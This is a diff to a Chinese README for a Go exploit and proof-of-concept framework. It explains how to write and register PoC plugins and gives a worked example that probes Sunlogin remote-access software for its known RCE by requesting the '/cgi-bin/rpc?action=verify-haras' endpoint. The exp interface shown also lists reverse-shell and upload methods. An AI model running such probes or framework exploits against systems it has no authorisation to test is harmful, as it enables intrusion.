@@ -59,6 +59,8 @@ func (self *exp) Reverse1(ip, port string) (expResult exp_model.ExpResult)
 func (self *exp) Upload1(filename string, content string) (expUploadResult exp_model.ExpUploadResult)
 ```
 
+PS: 返回值均为结构体，详细说明可直接查看代码注释
+
 
 
 ### 编写exp举例
@@ -97,7 +99,7 @@ func (self *Exp_VUL1) Cmd2(cmd string) (expResult exp_model.ExpResult) {
 
 ![image-20220503185333176](README.assets/image-20220503185333176.png)
 
-self.Params里有你需要的各种请求参数。
+self.Params里有需要的各种请求参数。
 
 ![image-20220503185359164](README.assets/image-20220503185359164.png)
 
@@ -440,6 +442,12 @@ func ExecCmdWithTimeout(timeout time.Duration, arg ...string) ([]byte, error) {}
 
 ## poc文件创建
 
+同exp文件规则。
+
+根目录为`modules/pocs/poc_plugins`，往下每个产品单独目录，目录名以`poc_`开头，每个目录下存在每个产品对应的各种漏洞exp的go文件，文件也是以`poc_`开头
+
+![image-20220505094817442](README.assets/image-20220505094817442.png)
+
 
 
 ## poc编写
@@ -458,11 +466,129 @@ import (
 
 ### poc结构体
 
+声明一个poc结构体，结构体名严格按照`Poc_`开头，一定要首字母大写，结构体内只需要继承`poc_templates.PocTemplate`即可
+
+![image-20220505094954260](README.assets/image-20220505094954260.png)
+
+
+
+接着就是poc的验证方法，因为一个漏洞可能有多种验证方式，存在不同payload，所以会有多个以`Poc[num]`格式的方法。
+
+方法签名如下，一定要严格按照该命名，否则无法解析。
+
+```go
+func (self *Poc) Poc[num]() (pocResult poc_model.PocPerPayloadResult)
+```
+
+
+
 ### 编写poc举例
+
+一个向日葵poc如下
+
+```go
+type Poc_SunloginRCE struct {
+	poc_templates.PocTemplate
+}
+
+type jsonResult struct {
+	Code_        int    `json:"__code"`
+	Enabled      string `json:"enabled"`
+	VerifyString string `json:"verify_string"`
+	Code         int    `json:"code"`
+}
+
+func (self *Poc_SunloginRCE) Poc1() (pocResult poc_model.PocPerPayloadResult) {
+	// 默认配置
+	pocResult.Status = false
+	headers := self.GetInitPocHeaders()
+
+	resp := self.HttpGet(self.AddUri(self.Params.Target, "/cgi-bin/rpc?action=verify-haras"), headers)
+	if resp.Err != nil {
+		return
+	}
+	jr := new(jsonResult)
+	err := json.Unmarshal([]byte(resp.Body), jr)
+	if err != nil {
+		pocResult.Err = err
+		return
+	}
+	if jr.VerifyString != "" {
+		pocResult.Status = true
+		pocResult.Messages = "CID=" + jr.VerifyString
+	}
+	//"{\"success\":false,\"msg\":\"Verification failure\"}"
+
+	return
+}
+```
+
+由于结构体继承了`poc_templates.PocTemplate`,可以使用父类的方法来处理（PS：这里只是引用了其他语言里基于对象的说法，go里没有对象）
+
+![image-20220505100327178](README.assets/image-20220505100327178.png)
+
+self.Params里有需要的各种请求参数。
+
+![image-20220505100401547](README.assets/image-20220505100401547.png)
+
+返回值是一个结构体，当漏洞存在Status为true
+
+```go
+type PocPerPayloadResult struct {
+	Status   bool   // 漏洞是否存在
+	Messages string // 漏洞信息
+	Err      error  // 错误
+}
+```
 
 
 
 ### 漏洞信息注册
+
+相较于exp来说，会简单许多，同样也是写在init()函数里
+
+```go
+func init() {
+	registerMsg := poc_register.PocRegisterMsg{Msg: poc_model.PocMsg{
+		Author:   "lz520520",
+		Time:     "2022-02-16",
+		Range:    "",
+		ID:       "",
+		Describe: "向日葵高端口RCE",
+	},
+		Proto: poc_model.PocHTTP,
+	}
+	poc_register.PocStructRegister(&Poc_SunloginRCE{}, registerMsg)
+}
+```
+
+调用`poc_register.PocStructRegister`传入漏洞结构体的引用，以及注册信息即可。
+
+注册信息目前只有量部分，漏洞基础信息，以及漏洞协议类型。
+
+```go
+// poc 信息栏
+type PocMsg struct {
+	Name     string // 漏洞名称，如果为空，则直接用结构体名
+	Author   string // 作者
+	Time     string // 发布时间
+	Range    string // 影响范围
+	ID       string // 漏洞编号
+	Describe string // 漏洞描述
+}
+```
+
+漏洞协议类型，大多是HTTP协议，其他协议主要是涉及端口，需要设置。
+
+```go
+var (
+	PocHTTP PocProto = "HTTP"
+	PocSMB  PocProto = "SMB"
+	PocRDP  PocProto = "RDP"
+)
+```
+
+
 
 
 
@@ -470,7 +596,29 @@ import (
 
 
 
+![image-20220505110044640](README.assets/image-20220505110044640.png)
+
+同样修改后可右键刷新，实现实时修改调整
+
+![image-20220505110326199](README.assets/image-20220505110326199.png)
+
+
+
+![image-20220505110104616](README.assets/image-20220505110104616.png)
+
+
+
+
+
+除此之外，在漏洞名上可右键-漏洞信息
+
+![image-20220505110706896](README.assets/image-20220505110706896.png)
+
 ## 常用函数
+
+这里不赘述了，和exp里的基本一样，直接看代码也行。
+
+
 
 
 
